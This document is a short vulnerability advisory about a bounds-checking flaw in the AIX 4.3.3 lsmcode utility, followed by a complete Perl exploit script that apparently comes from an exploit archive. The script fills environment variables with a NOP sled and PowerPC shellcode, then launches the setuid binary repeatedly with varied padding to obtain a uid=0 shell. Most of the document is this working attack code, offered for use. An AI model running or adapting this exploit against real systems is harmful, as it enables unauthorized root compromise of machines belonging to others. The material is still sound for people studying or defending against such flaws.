source: https://www.securityfocus.com/bid/7871/info

Insufficient bounds checking in the lsmcode utility will allow locally based attackers to cause memory to be corrupted with attacker-supplied data. As a result, it is possible to exploit this condition to execute arbitrary attacker-supplied instructions with elevated privileges.

#!/usr/bin/perl
# FileName: x_lsmcode_aix4x.pl
# Exploit lsmcode of Aix4.3.3 to get a uid=0 shell.
# Tested  : on Aix4.3.3.Mybe can work on other versions.
# Author  : watercloud@xfocus.org
# Site    : www.xfocus.org   www.xfocus.net
# Date    : 2003-6-1
# Announce: use as your owner risk!

$CMD="/usr/sbin/lsmcode";
$_=`/usr/bin/oslevel`;

$XID="\x03";
$UID="\x97";
print "\n\nExploit $CMD for Aix 4.3.3 to get uid=0 shell.\n";
print "From: [ www.xfocus.org 2003-6-1 ].\n\n";

$NOP="\x7c\xa5\x2a\x79"x800;
%ENV=();

$ENV{CCC}="A" .$NOP.&getshell($XID,$UID);
$ENV{DIAGNOSTICS}="\x2f\xf2\x2a\x2f"x300;
$ret = system $CMD ,"-d","a";

for($i=0;$i<4 && $ret;$i++){
  for($j=0;$j<4 && $ret;$j++) {
    $ENV{CCC}="A"x $i .$NOP.&getshell($XID,$UID);
    $ENV{DIAGNOSTICS}="A"x $j ."\x2f\xf2\x2a\x2f"x300;
    $ret = system $CMD ,"-d","a";
  }
}

#sub
sub getshell($XID,$GID) {
  my $SHELL,($XID,$GID)=@_;
  $SHELL="\x7e\x94\xa2\x79\x7e\x84\xa3\x78\x40\x82\xff\xfd";
  $SHELL.="\x7e\xa8\x02\xa6\x3a\xb5\x01\x40\x88\x55\xfe\xe0";
  $SHELL.="\x7e\x83\xa3\x78\x3a\xd5\xfe\xe4\x7e\xc8\x03\xa6";
  $SHELL.="\x4c\xc6\x33\x42\x44\xff\xff\x02$GID$XID\xff\xff";
  $SHELL.="\x38\x75\xff\x04\x38\x95\xff\x0c\x7e\x85\xa3\x78";
  $SHELL.="\x90\x75\xff\x0c\x92\x95\xff\x10\x88\x55\xfe\xe1";
  $SHELL.="\x9a\x95\xff\x0b\x4b\xff\xff\xd8/bin/sh\xff";
  return $SHELL;
}
#EOF